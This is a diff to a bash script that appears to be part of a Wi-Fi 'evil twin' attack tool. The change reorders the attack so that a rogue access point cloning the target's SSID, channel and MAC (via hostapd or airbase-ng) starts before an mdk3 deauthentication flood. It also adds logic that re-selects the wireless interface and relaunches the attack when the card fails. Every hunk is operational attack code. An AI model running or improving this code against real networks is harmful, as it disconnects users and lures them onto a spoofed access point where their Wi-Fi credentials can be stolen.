@@ -6,6 +6,9 @@ if [ -z ${FLUX_DEBUG+x} ]; then FLUX_DEBUG=0
 fi
 ################################
 
+#Keep dump file
+KEEP_DUMP=0
+
 ####### preserve network #######
 if [ -z ${KEEP_NETWORK+x} ]; then KEEP_NETWORK=0
     else KEEP_NETWORK=1
@@ -2103,8 +2106,17 @@ function MyAttack {
                 ifconfig $WIFI up
                 sleep 0.4
         fi
+        if [ $fakeapmode = "hostapd" ]; then
+                killall hostapd &> $flux_output_device
+                sleep 0.5
+                xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e hostapd $DUMP_PATH/hostapd.conf &
+        elif [ $fakeapmode = "airbase-ng" ]; then
+                killall airbase-ng &> $flux_output_device
+                xterm $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e airbase-ng -P -e $Host_SSID -c $Host_CHAN -a ${mac::13}$nomac${mac:14:4} $WIFI_MONITOR &
+        fi
 
 
+        sleep 3
 
         killall dhcpd &> $flux_output_device
         fuser -n tcp -k 53 67 80 &> $flux_output_device
@@ -2119,25 +2131,26 @@ function MyAttack {
         killall mdk3 &> $flux_output_device
         echo "$Host_MAC" >$DUMP_PATH/mdk3.txt
         xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FF0009" -title "Deauth all [mdk3]  $Host_SSID" -e mdk3 $WIFI_MONITOR d -b $DUMP_PATH/mdk3.txt -c $Host_CHAN &
-        sleep 3
-        if [ $fakeapmode = "hostapd" ]; then
-                killall hostapd &> $flux_output_device
-                sleep 0.5
-                xterm $HOLD $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e hostapd $DUMP_PATH/hostapd.conf &
-        elif [ $fakeapmode = "airbase-ng" ]; then
-                killall airbase-ng &> $flux_output_device
-                xterm $BOTTOMRIGHT -bg "#000000" -fg "#FFFFFF" -title "AP" -e airbase-ng -P -e $Host_SSID -c $Host_CHAN -a ${mac::13}$nomac${mac:14:4} $WIFI_MONITOR &
-        fi
 
         mknod $DUMP_PATH/spipe p  2>/dev/null
 }
 
-#monitor WireLessCard
-function monitor_wc {
-    while  grep dead_wc $DUMP_PATH/spipe >/dev/null; do
+function MySetInterface {
         killIF
         selectIF
+        if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
+               MySetInterface 
+        fi
         initIF
+}
+#monitor WireLessCard
+function monitor_wc {
+    while grep dead_wc $DUMP_PATH/spipe >/dev/null; do
+        OKD=$KEEP_DUMP
+        KEEP_DUMP=1
+        (exitmode >/dev/null)
+        KEEP_DUMP=$OKD
+        MySetInterface
         MyAttack
     done
 }
